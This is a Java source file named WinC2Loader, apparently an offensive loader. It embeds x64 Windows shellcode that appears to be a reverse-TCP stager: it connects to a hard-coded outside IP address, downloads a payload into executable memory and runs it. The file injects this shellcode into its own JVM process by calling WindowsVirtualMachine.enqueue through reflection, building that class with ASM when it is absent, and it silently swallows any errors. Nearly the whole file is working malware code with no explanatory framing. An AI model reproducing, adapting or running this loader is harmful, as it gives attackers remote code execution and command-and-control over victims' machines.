import jdk.internal.org.objectweb.asm.ClassWriter;
import jdk.internal.org.objectweb.asm.Label;
import jdk.internal.org.objectweb.asm.MethodVisitor;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;


/**
 * javac -bootclasspath "/Library/Internet Plug-Ins/JavaAppletPlugin.plugin/Contents/Home/lib/rt.jar" WinC2Loader.java
 */
public class WinC2Loader extends ClassLoader {

    public void test(){
        try {
            WinC2Loader loader = new WinC2Loader();
            int pid = Integer.parseInt(getCurrentPID());
            String clazzName = "sun.tools.attach.WindowsVirtualMachine";

            //插入shellcode
            byte[] shellcode = new byte[]{
                    (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xcc, (byte) 0x00,
                    (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                    (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                    (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                    (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                    (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                    (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                    (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x81, (byte) 0x78,
                    (byte) 0x18, (byte) 0x0b, (byte) 0x02, (byte) 0x0f, (byte) 0x85, (byte) 0x72, (byte) 0x00, (byte) 0x00,
                    (byte) 0x00, (byte) 0x8b, (byte) 0x80, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48,
                    (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50,
                    (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49,
                    (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56, (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41,
                    (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31,
                    (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0, (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9,
                    (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1,
                    (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24, (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1,
                    (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49,
                    (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41, (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44,
                    (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b,
                    (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41,
                    (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59,
                    (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83, (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52,
                    (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b,
                    (byte) 0x12, (byte) 0xe9, (byte) 0x4b, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x49,
                    (byte) 0xbe, (byte) 0x77, (byte) 0x73, (byte) 0x32, (byte) 0x5f, (byte) 0x33, (byte) 0x32, (byte) 0x00,
                    (byte) 0x00, (byte) 0x41, (byte) 0x56, (byte) 0x49, (byte) 0x89, (byte) 0xe6, (byte) 0x48, (byte) 0x81,
                    (byte) 0xec, (byte) 0xa0, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x89, (byte) 0xe5,
                    (byte) 0x49, (byte) 0xbc, (byte) 0x02, (byte) 0x00, (byte) 0xfe, (byte) 0x63, (byte) 0x68, (byte) 0xc7,
                    (byte) 0x87, (byte) 0x2e, (byte) 0x41, (byte) 0x54, (byte) 0x49, (byte) 0x89, (byte) 0xe4, (byte) 0x4c,
                    (byte) 0x89, (byte) 0xf1, (byte) 0x41, (byte) 0xba, (byte) 0x4c, (byte) 0x77, (byte) 0x26, (byte) 0x07,
                    (byte) 0xff, (byte) 0xd5, (byte) 0x4c, (byte) 0x89, (byte) 0xea, (byte) 0x68, (byte) 0x01, (byte) 0x01,
                    (byte) 0x00, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0xba, (byte) 0x29, (byte) 0x80, (byte) 0x6b,
                    (byte) 0x00, (byte) 0xff, (byte) 0xd5, (byte) 0x6a, (byte) 0x0a, (byte) 0x41, (byte) 0x5e, (byte) 0x50,
                    (byte) 0x50, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x4d, (byte) 0x31, (byte) 0xc0, (byte) 0x48,
                    (byte) 0xff, (byte) 0xc0, (byte) 0x48, (byte) 0x89, (byte) 0xc2, (byte) 0x48, (byte) 0xff, (byte) 0xc0,
                    (byte) 0x48, (byte) 0x89, (byte) 0xc1, (byte) 0x41, (byte) 0xba, (byte) 0xea, (byte) 0x0f, (byte) 0xdf,
                    (byte) 0xe0, (byte) 0xff, (byte) 0xd5, (byte) 0x48, (byte) 0x89, (byte) 0xc7, (byte) 0x6a, (byte) 0x10,
                    (byte) 0x41, (byte) 0x58, (byte) 0x4c, (byte) 0x89, (byte) 0xe2, (byte) 0x48, (byte) 0x89, (byte) 0xf9,
                    (byte) 0x41, (byte) 0xba, (byte) 0x99, (byte) 0xa5, (byte) 0x74, (byte) 0x61, (byte) 0xff, (byte) 0xd5,
                    (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x0a, (byte) 0x49, (byte) 0xff, (byte) 0xce, (byte) 0x75,
                    (byte) 0xe5, (byte) 0xe8, (byte) 0x93, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x83,
                    (byte) 0xec, (byte) 0x10, (byte) 0x48, (byte) 0x89, (byte) 0xe2, (byte) 0x4d, (byte) 0x31, (byte) 0xc9,
                    (byte) 0x6a, (byte) 0x04, (byte) 0x41, (byte) 0x58, (byte) 0x48, (byte) 0x89, (byte) 0xf9, (byte) 0x41,
                    (byte) 0xba, (byte) 0x02, (byte) 0xd9, (byte) 0xc8, (byte) 0x5f, (byte) 0xff, (byte) 0xd5, (byte) 0x83,
                    (byte) 0xf8, (byte) 0x00, (byte) 0x7e, (byte) 0x55, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x20,
                    (byte) 0x5e, (byte) 0x89, (byte) 0xf6, (byte) 0x6a, (byte) 0x40, (byte) 0x41, (byte) 0x59, (byte) 0x68,
                    (byte) 0x00, (byte) 0x10, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x58, (byte) 0x48, (byte) 0x89,
                    (byte) 0xf2, (byte) 0x48, (byte) 0x31, (byte) 0xc9, (byte) 0x41, (byte) 0xba, (byte) 0x58, (byte) 0xa4,
                    (byte) 0x53, (byte) 0xe5, (byte) 0xff, (byte) 0xd5, (byte) 0x48, (byte) 0x89, (byte) 0xc3, (byte) 0x49,
                    (byte) 0x89, (byte) 0xc7, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x49, (byte) 0x89, (byte) 0xf0,
                    (byte) 0x48, (byte) 0x89, (byte) 0xda, (byte) 0x48, (byte) 0x89, (byte) 0xf9, (byte) 0x41, (byte) 0xba,
                    (byte) 0x02, (byte) 0xd9, (byte) 0xc8, (byte) 0x5f, (byte) 0xff, (byte) 0xd5, (byte) 0x83, (byte) 0xf8,
                    (byte) 0x00, (byte) 0x7d, (byte) 0x28, (byte) 0x58, (byte) 0x41, (byte) 0x57, (byte) 0x59, (byte) 0x68,
                    (byte) 0x00, (byte) 0x40, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x58, (byte) 0x6a, (byte) 0x00,
                    (byte) 0x5a, (byte) 0x41, (byte) 0xba, (byte) 0x0b, (byte) 0x2f, (byte) 0x0f, (byte) 0x30, (byte) 0xff,
                    (byte) 0xd5, (byte) 0x57, (byte) 0x59, (byte) 0x41, (byte) 0xba, (byte) 0x75, (byte) 0x6e, (byte) 0x4d,
                    (byte) 0x61, (byte) 0xff, (byte) 0xd5, (byte) 0x49, (byte) 0xff, (byte) 0xce, (byte) 0xe9, (byte) 0x3c,
                    (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x48, (byte) 0x01, (byte) 0xc3, (byte) 0x48, (byte) 0x29,
                    (byte) 0xc6, (byte) 0x48, (byte) 0x85, (byte) 0xf6, (byte) 0x75, (byte) 0xb4, (byte) 0x41, (byte) 0xff,
                    (byte) 0xe7, (byte) 0x58, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x49, (byte) 0xc7, (byte) 0xc2,
                    (byte) 0xf0, (byte) 0xb5, (byte) 0xa2, (byte) 0x56, (byte) 0xff, (byte) 0xd5
            };

            Class WindowsVirtualMachineClazz;
            try {
                WindowsVirtualMachineClazz = Class.forName(clazzName);
            } catch (ClassNotFoundException var9) {
                byte[] classBytes = dump();
                WindowsVirtualMachineClazz = loader.defineClass(clazzName, classBytes, 0, classBytes.length);
            }

            Method openProcessM = WindowsVirtualMachineClazz.getDeclaredMethod("openProcess", Integer.TYPE);
            openProcessM.setAccessible(true);
            long hProcess = (Long)openProcessM.invoke((Object)null, pid);
            Method enqueueM = WindowsVirtualMachineClazz.getDeclaredMethod("enqueue", Long.TYPE, byte[].class, String.class, String.class, Object[].class);
            enqueueM.setAccessible(true);
            enqueueM.invoke((Object)null, hProcess, shellcode, null, null, new Object[0]);
        } catch (Exception var10) {
        }
    }

    private static String getCurrentPID() {
        String name = ManagementFactory.getRuntimeMXBean().getName();
        String pid = name.split("@")[0];
        return pid;
    }

    public static byte[] dump() {
        ClassWriter cw = new ClassWriter(0);
        cw.visit(52, 33, "sun/tools/attach/WindowsVirtualMachine", (String)null, "java/lang/Object", (String[])null);
        cw.visitSource("WindowsVirtualMachine.java", (String)null);
        MethodVisitor mv = cw.visitMethod(1, "<init>", "()V", (String)null, (String[])null);
        mv.visitCode();
        Label l0 = new Label();
        mv.visitLabel(l0);
        mv.visitVarInsn(25, 0);
        mv.visitMethodInsn(183, "java/lang/Object", "<init>", "()V", false);
        mv.visitInsn(177);
        Label l1 = new Label();
        mv.visitLabel(l1);
        mv.visitLocalVariable("this", "Lsun/tools/attach/WindowsVirtualMachine;", (String)null, l0, l1, 0);
        mv.visitMaxs(1, 1);
        mv.visitEnd();
        mv = cw.visitMethod(265, "init", "()V", (String)null, (String[])null);
        mv.visitEnd();
        mv = cw.visitMethod(265, "openProcess", "(I)J", (String)null, new String[]{"java/io/IOException"});
        mv.visitEnd();
        mv = cw.visitMethod(265, "closeProcess", "(J)V", (String)null, new String[]{"java/io/IOException"});
        mv.visitEnd();
        mv = cw.visitMethod(393, "enqueue", "(J[BLjava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V", (String)null, new String[]{"java/io/IOException"});
        mv.visitEnd();
        mv = cw.visitMethod(8, "<clinit>", "()V", (String)null, (String[])null);
        mv.visitCode();
        l0 = new Label();
        mv.visitLabel(l0);
        mv.visitLdcInsn("attach");
        mv.visitMethodInsn(184, "java/lang/System", "loadLibrary", "(Ljava/lang/String;)V", false);
        l1 = new Label();
        mv.visitLabel(l1);
        mv.visitMethodInsn(184, "sun/tools/attach/WindowsVirtualMachine", "init", "()V", false);
        Label l2 = new Label();
        mv.visitLabel(l2);
        mv.visitInsn(177);
        mv.visitMaxs(1, 0);
        mv.visitEnd();
        cw.visitEnd();
        return cw.toByteArray();
    }

    public static void main(String[] args) {
        WinC2Loader t = new WinC2Loader();
        t.test();
    }
}